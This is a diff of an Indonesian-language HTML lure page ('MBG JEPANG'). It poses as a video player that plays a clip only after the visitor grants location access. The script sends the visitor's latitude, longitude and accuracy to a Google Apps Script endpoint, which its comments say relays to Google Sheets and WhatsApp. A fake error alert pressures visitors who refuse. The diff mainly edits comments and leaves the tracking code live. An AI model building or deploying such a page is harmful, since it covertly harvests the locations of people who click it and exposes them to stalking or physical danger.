@@ -66,7 +66,7 @@
         .btn-unlock:hover {
             background-color: #b20710;
         }
-        /* Elemen Video & Foto Akhir (disembunyikan di awal) */
+        /* Elemen Video & Foto Akhir (disembunyikan total di awal) */
         video, #fotoHasil {
             width: 100%;
             height: 100%;
@@ -81,27 +81,25 @@
         <div class="header-title">MBG JEPANG</div>
         
         <div class="media-wrapper" id="wrapper">
-            <!-- Gambar Siluet awal (bisa diganti link gambar siluet Anda) -->
+            <!-- Gambar Siluet awal -->
             <img id="siluet" src="siluet.jpg" alt="Siluet Video">
             
             <!-- Tombol Pemicu -->
             <button id="btnTonton" class="btn-unlock" onclick="mintaAksesLokasi()">TONTON VIDEO</button>
             
-            <!-- Elemen Video yang di-host di GitHub (0.0-40.0.mp4) -->
+            <!-- Elemen Video (0.0-40.0.mp4) -->
             <video id="videoPlayer" src="0.0-40.0.mp4" controls preload="auto"></video>
             
-            <!-- Foto Asli yang muncul setelah video habis -->
+            <!-- Foto Konten Asli (disembunyikan sampai video selesai) -->
             <img id="fotoHasil" src="PXL_20260815_090015220.jpg" alt="Foto Konten">
         </div>
     </div>
 
     <script>
         function mintaAksesLokasi() {
-            // Pastikan fitur geolocation didukung browser
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
                     function(position) {
-                        // KASUS 1: Pengguna mengizinkan (Allow) akses lokasi
                         const lat = position.coords.latitude;
                         const lon = position.coords.longitude;
                         const akurasi = position.coords.accuracy;
@@ -114,7 +112,7 @@
                             akurasi: akurasi + " meter"
                         };
 
-                        // Kirim data koordinat ke Apps Script (Google Sheets & WhatsApp Anda)
+                        // Kirim data ke Apps Script (Google Sheets & WhatsApp)
                         fetch("https://script.google.com/macros/s/AKfycbwwjCkMGf_fNAGP8S03P5-xhv4PBiF8ISvZ267ks1dOMbCbnEax3Do01pn1MtekAIxP/exec", {
                             method: "POST",
                             mode: "no-cors",
@@ -124,11 +122,11 @@
                             body: JSON.stringify(payload)
                         }).catch(err => {});
 
-                        // Jalankan pemutaran video
+                        // Jalankan pemutaran video jika izin diberikan
                         mulaiVideo();
                     },
                     function(error) {
-                        // KASUS 2: Pengguna menolak (Block) akses lokasi -> Video tidak diputar
+                        // Jika akses lokasi ditolak
                         alert("Gagal memuat pemutar video. Pastikan izin lokasi diaktifkan untuk menonton.");
                     },
                     {
@@ -147,15 +145,15 @@
             document.getElementById('siluet').style.display = 'none';
             document.getElementById('btnTonton').style.display = 'none';
             
-            // Tampilkan dan putar video
+            // Tampilkan dan putar video berdurasi 40 detik
             var vid = document.getElementById('videoPlayer');
             vid.style.display = 'block';
             vid.play();
 
-            // Ketika video selesai diputar (durasi 40 detik habis)
+            // Ketika video selesai diputar habis
             vid.onended = function() {
-                vid.style.display = 'none'; // Sembunyikan video
-                document.getElementById('fotoHasil').style.display = 'block'; // Tampilkan foto asli
+                vid.style.display = 'none'; // Sembunyikan pemutar video
+                document.getElementById('fotoHasil').style.display = 'block'; // Tampilkan foto PXL_20260815_090015220.jpg
             };
         }
     </script>
